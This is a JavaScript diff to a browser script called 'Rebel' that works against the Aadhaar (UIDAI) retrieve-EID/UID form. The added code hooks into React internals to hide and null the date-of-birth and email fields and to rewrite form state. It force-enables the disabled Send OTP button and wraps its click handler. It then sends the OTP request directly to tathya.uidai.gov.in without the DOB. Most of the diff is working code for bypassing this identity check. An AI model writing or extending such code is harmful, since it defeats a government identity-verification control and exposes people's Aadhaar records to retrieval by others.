@@ -11,7 +11,7 @@
   const DISABLED_MARK = 'rebel-dob-disabled';
   const HIDDEN_MARK = 'rebel-dob-hidden';
   const DOB_LABEL = /date\s*of\s*birth|\bdob\b|birth\s*date|जन्म|जन्म\s*तिथि/i;
-  const ENGINE_VERSION = '12.3.0';
+  const ENGINE_VERSION = '12.4.0';
 
   let dobWatcher = null;
   let watchTimer = null;
@@ -92,6 +92,8 @@
 
   function isDobInput(input) {
     if (!input || input.type === 'hidden') return false;
+    const n = norm(input.name || input.id || '');
+    if (n === 'dob' || n === 'calender') return true;
     const blob = labelTextFor(input, fieldContainer(input));
     const ph = norm(input.placeholder || '');
     return (
@@ -102,6 +104,248 @@
       input.hasAttribute('matdatepicker') ||
       !!input.closest('mat-form-field')?.querySelector('mat-datepicker-toggle')
     );
+  }
+
+  function detectFramework() {
+    if (document.querySelector('#root') && !document.querySelector('[ng-version], app-root')) return 'react';
+    if (document.querySelector('[ng-version], app-root')) return 'angular';
+    const sample = document.querySelector('input[name="mobile"], input[name="name"]');
+    if (sample && Object.keys(sample).some((k) => k.startsWith('__reactFiber'))) return 'react';
+    return 'unknown';
+  }
+
+  function isReactSite() {
+    return detectFramework() === 'react';
+  }
+
+  function getReactFiber(el) {
+    if (!el) return null;
+    const k = Object.keys(el).find((x) => x.startsWith('__reactFiber'));
+    return k ? el[k] : null;
+  }
+
+  function getReactProps(el) {
+    if (!el) return null;
+    const k = Object.keys(el).find((x) => x.startsWith('__reactProps'));
+    return k ? el[k] : null;
+  }
+
+  function setReactInputValue(input, val, log) {
+    if (!input) return false;
+    const props = getReactProps(input);
+    try {
+      if (input._valueTracker) input._valueTracker.setValue('');
+      nativeInputSet?.call(input, val);
+    } catch (_e) {}
+    try {
+      input.dispatchEvent(
+        new InputEvent('input', { bubbles: true, cancelable: true, inputType: 'insertText', data: val })
+      );
+    } catch (_e1) {
+      input.dispatchEvent(new Event('input', { bubbles: true, cancelable: true }));
+    }
+    input.dispatchEvent(new Event('change', { bubbles: true, cancelable: true }));
+    if (props?.onChange) {
+      try {
+        props.onChange({ target: input, currentTarget: input });
+      } catch (_e2) {}
+    }
+    return true;
+  }
+
+  function findReactFormWrapper() {
+    const btn = findOtpButton();
+    let f = getReactFiber(btn);
+    for (let i = 0; i < 20 && f; i++, f = f.return) {
+      if (f.pendingProps && 'checkNullValues' in f.pendingProps && f.stateNode?.state?.form_values) return f;
+    }
+    return null;
+  }
+
+  function findReactPageFiber() {
+    const btn = findOtpButton();
+    let f = getReactFiber(btn);
+    for (let i = 0; i < 20 && f; i++, f = f.return) {
+      if (f.pendingProps?.state?.formData && f.pendingProps?.dispatch) return f;
+    }
+    return null;
+  }
+
+  function patchReactFormValues(log) {
+    const wrap = findReactFormWrapper();
+    if (!wrap?.stateNode?.state?.form_values) return 0;
+    let n = 0;
+    const vals = { name: readFieldVal('name'), mobile: readFieldVal('mobile'), captcha: readFieldVal('captcha') };
+    wrap.stateNode.state.form_values.forEach((row) => {
+      if (row.name === 'dob' || row.name === 'email') {
+        row.input = '';
+        row.error = false;
+        row.error_msg = '';
+        n += 1;
+        return;
+      }
+      const v = vals[row.name];
+      if (v) {
+        row.input = v;
+        row.error = false;
+        row.error_msg = '';
+        n += 1;
+      }
+    });
+    const page = findReactPageFiber();
+    if (page?.pendingProps?.state?.formData) {
+      page.pendingProps.state.formData.dob = null;
+      page.pendingProps.state.formData.email = null;
+      page.pendingProps.state.disableOTP = false;
+      n += 1;
+    }
+    if (n) log?.('info', 'React form_values patched', { count: n });
+    return n;
+  }
+
+  function getReactCaptchaTxn() {
+    const page = findReactPageFiber();
+    return (
+      page?.pendingProps?.state?.captchaTxnID ||
+      page?.pendingProps?.state?.captchaTxnId ||
+      ''
+    );
+  }
+
+  function buildReactOtpPayload() {
+    const reqType =
+      document.querySelector('#uid:checked, input[name="pvc"][value="uid"]:checked, .pvc_uid:checked') ||
+      norm(document.body?.innerText || '').includes('aadhaar number')
+        ? 'UID'
+        : 'EID';
+    return {
+      mobileNumber: readFieldVal('mobile'),
+      dob: null,
+      email: null,
+      name: readFieldVal('name'),
+      option: /eid/i.test(reqType) ? 'EID' : 'UID',
+      otp: null,
+      otpTxnId: null,
+      captchaTxnId: getReactCaptchaTxn(),
+      captcha: readFieldVal('captcha'),
+      resendOtp: false,
+    };
+  }
+
+  async function reactGenerateOtpFetch(log) {
+    const payload = buildReactOtpPayload();
+    if (!payload.mobileNumber || !payload.captcha || !payload.captchaTxnId) {
+      log?.('warn', 'React OTP skip — mobile/captcha/txn missing', payload);
+      return false;
+    }
+    const url = 'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid';
+    const clean = stripDobFromBody(payload).body;
+    try {
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: {
+          Accept: 'application/json, text/plain, */*',
+          'Content-Type': 'application/json',
+          appid: 'MYAADHAAR',
+        },
+        credentials: 'include',
+        body: JSON.stringify(clean),
+      });
+      const text = await res.text();
+      log?.('info', 'React OTP fetch', { status: res.status, resp: text.slice(0, 160) });
+      return res.status >= 200 && res.status < 300;
+    } catch (err) {
+      log?.('warn', 'React OTP fetch fail', String(err).slice(0, 100));
+      return false;
+    }
+  }
+
+  function patchReactOtpClick(uiSel, log) {
+    const btn = findOtpButton();
+    const parent = getReactFiber(btn)?.return;
+    if (!parent?.pendingProps || parent.pendingProps.__rebelOtpWrapped) return false;
+    const orig = parent.pendingProps.onClick;
+    if (typeof orig !== 'function') return false;
+    const wrapped = function rebelWrappedOtpClick(ev) {
+      patchReactFormValues(log);
+      enableReactOtpButton(log);
+      if (isDobBypassed(uiSel)) {
+        reactGenerateOtpFetch(log);
+        return;
+      }
+      try {
+        orig.call(this, ev);
+      } catch (_e) {}
+    };
+    parent.pendingProps.onClick = wrapped;
+    parent.pendingProps.__rebelOtpWrapped = true;
+    if (parent.memoizedProps) parent.memoizedProps.onClick = wrapped;
+    log?.('info', 'React Send OTP click wrapped');
+    return true;
+  }
+
+  function enableReactOtpButton(log) {
+    const btn = findOtpButton();
+    if (!btn) return false;
+    const parent = getReactFiber(btn)?.return;
+    if (parent?.pendingProps) {
+      parent.pendingProps.disabled = false;
+      if (parent.memoizedProps) parent.memoizedProps.disabled = false;
+    }
+    btn.disabled = false;
+    btn.removeAttribute('disabled');
+    btn.classList.remove('mat-mdc-button-disabled', 'mat-button-disabled', 'disabled', 'mdc-button--disabled');
+    btn.style.pointerEvents = 'auto';
+    btn.style.opacity = '1';
+    log?.('info', 'React Send OTP enabled', { wasDisabled: parent?.pendingProps?.disabled });
+    return true;
+  }
+
+  function neutralizeReactDob(uiSel, log) {
+    injectCss();
+    let n = 0;
+    getDobInputs().forEach((input) => {
+      setReactInputValue(input, '', log);
+      input.removeAttribute('required');
+      input.required = false;
+      input.dataset.rebelDobOff = '1';
+      const box = fieldContainer(input);
+      if (box) {
+        box.classList.add(HIDDEN_MARK);
+        box.setAttribute('data-rebel-dob-hidden', '1');
+        box.style.setProperty('display', 'none', 'important');
+      }
+      n += 1;
+    });
+    qAll('input[name="email"]').forEach((input) => {
+      setReactInputValue(input, '', log);
+      const box = fieldContainer(input);
+      if (box) {
+        box.classList.add('rebel-email-hidden');
+        box.setAttribute('data-rebel-email-hidden', '1');
+        box.style.setProperty('display', 'none', 'important');
+      }
+    });
+    patchReactFormValues(log);
+    enableReactOtpButton(log);
+    if (n) log?.('info', 'React DOB neutralized', { count: n });
+    return n;
+  }
+
+  function syncReactInputs(log) {
+    if (!isReactSite()) return 0;
+    let n = 0;
+    getMatFields().forEach((f) => {
+      const type = classifyField(f);
+      if (type === 'dob' || type === 'toggle' || type === 'email') return;
+      const val = readInputVal(f.input);
+      if (!val) return;
+      if (setReactInputValue(f.input, val, log)) n += 1;
+    });
+    patchReactFormValues(log);
+    enableReactOtpButton(log);
+    if (n) log?.('info', 'React inputs synced', { count: n });
+    return n;
   }
 
   function getDobInputs() {
@@ -152,6 +396,12 @@
   }
 
   function classifyField(f) {
+    const byName = norm(f.input?.name || f.input?.id || '');
+    if (byName === 'dob' || byName === 'calender') return 'dob';
+    if (byName === 'mobile') return 'mobile';
+    if (byName === 'email') return 'email';
+    if (byName === 'captcha') return 'captcha';
+    if (byName === 'name') return 'name';
     const l = f.label;
     if (DOB_LABEL.test(l) || isDobInput(f.input)) return 'dob';
     if (/^or\s/.test(l)) return 'toggle';
@@ -306,11 +556,12 @@
     }
     if (/\/send-metrics\b/i.test(u)) return false;
     if (String(method || 'GET').toUpperCase() !== 'POST') return false;
-    return /retrieveuideid|\/generic\/|retrieve|generateotp|sendotp|otp|captcha|auth|validate|uideid/i.test(u);
+    return /retrieveuideid|retrieveeiduid|\/generic\/|retrieve|generateotp|sendotp|otp|captcha|auth|validate|uideid/i.test(u);
   }
 
   function shouldStripServerPost(url) {
     const u = String(url || '');
+    if (/retrieveeiduid|tathya\.uidai\.gov\.in/i.test(u)) return true;
     if (isRetrieveOtpUrl(u)) return true;
     if (/^\//.test(u) && /myaadhaar|uidai|retrieve|otp|aadhaar/i.test(location.pathname + location.host)) return true;
     if (/uidai\.gov\.in|myaadhaar/i.test(u)) return true;
@@ -531,6 +782,17 @@
   let lastModeClickAt = 0;
 
   function advancedBypass(uiSel, log) {
+    if (isReactSite()) {
+      if (dobFieldVisible(uiSel)) neutralizeReactDob(uiSel, log);
+      softHideEmailOnly(log, uiSel);
+      enableReactOtpButton(log);
+      patchReactOtpClick(uiSel, log);
+      return {
+        dobBypassed: isDobBypassed(uiSel),
+        dobVisible: dobFieldVisible(uiSel),
+        orLinks: discoverOrLinks(uiSel).map((l) => l.text),
+      };
+    }
     if (!isDobBypassed(uiSel) && !shouldSkipEmailToggle(uiSel) && Date.now() - lastModeClickAt > 3000) {
       quickModeSwitch(uiSel, log);
       lastModeClickAt = Date.now();
@@ -671,6 +933,7 @@
   }
 
   function syncAngularInputs(log) {
+    if (isReactSite()) return syncReactInputs(log);
     let n = 0;
     getMatFields().forEach((f) => {
       const type = classifyField(f);
@@ -1431,13 +1694,23 @@
   }
 
   function prepForUserOtp(uiSel, log) {
-    if (dobFieldVisible(uiSel)) removeDobFromDom(uiSel, log);
-    fixAngularValidators(log);
-    patchAngularControlValues(log);
-    syncAngularInputs(log);
-    syncNgControlsFromDom(log);
-    enableOtpButtons();
-    enableMatOtpButton(log);
+    if (dobFieldVisible(uiSel)) {
+      if (isReactSite()) neutralizeReactDob(uiSel, log);
+      else removeDobFromDom(uiSel, log);
+    }
+    if (isReactSite()) {
+      syncReactInputs(log);
+      patchReactFormValues(log);
+      enableReactOtpButton(log);
+      patchReactOtpClick(uiSel, log);
+    } else {
+      fixAngularValidators(log);
+      patchAngularControlValues(log);
+      syncAngularInputs(log);
+      syncNgControlsFromDom(log);
+      enableOtpButtons();
+      enableMatOtpButton(log);
+    }
     return buildSubmitState(uiSel, log, { quiet: true });
   }
 
@@ -1540,7 +1813,9 @@
       })
       .map((f) => ({ type: classifyField(f), hasNg: !!findNgControlFromElement(f.input)?.control }));
     const otpBtn = findOtpButton();
+    const framework = detectFramework();
     return {
+      framework,
       formCount: groups.length,
       ngControls: collectNgControls().length,
       ngFieldHits: ngHits,
@@ -1909,6 +2184,7 @@
   }
 
   function enableOtpButtons() {
+    if (isReactSite()) enableReactOtpButton();
     qAll('button, [role="button"], input[type="submit"]').forEach((btn) => {
       const t = norm(btn.textContent || btn.value || '');
       if (!t.includes('send otp') && !t.includes('request otp')) return;
@@ -2013,6 +2289,19 @@
 
   return {
     ENGINE_VERSION,
+    detectFramework,
+    isReactSite,
+    setReactInputValue,
+    syncReactInputs,
+    patchReactFormValues,
+    enableReactOtpButton,
+    neutralizeReactDob,
+    patchReactOtpClick,
+    reactGenerateOtpFetch,
+    getReactFiber,
+    getReactProps,
+    findReactFormWrapper,
+    findReactPageFiber,
     norm,
     DISABLED_MARK,
     HIDDEN_MARK,
@@ -2145,7 +2434,7 @@
       stopPrepLoop();
       return;
     }
-    emit('info', 'Rebel PAGE v' + E.ENGINE_VERSION + ' — khud Send OTP dabao');
+    emit('info', 'Rebel PAGE v' + E.ENGINE_VERSION + ' — ' + (E.detectFramework ? E.detectFramework() : 'page') + ' — khud Send OTP dabao');
     E.waitForForm(30000).then(function (ready) {
       if (!ready) {
         emit('warn', 'Form timeout — page reload karo');
